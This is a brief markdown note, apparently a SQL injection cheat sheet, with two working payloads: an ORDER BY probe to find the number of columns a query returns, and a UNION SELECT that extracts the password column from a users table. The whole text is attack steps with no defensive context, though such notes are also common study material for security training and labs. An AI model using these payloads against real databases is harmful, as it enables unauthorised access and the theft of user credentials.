## Find the number of fields being retrieved 

`
1' ORDER BY N#
`

Replace N by 1,2,3

## Do UNION attacks to get the values
`
1' UNION SELECT NULL,password FROM users#
`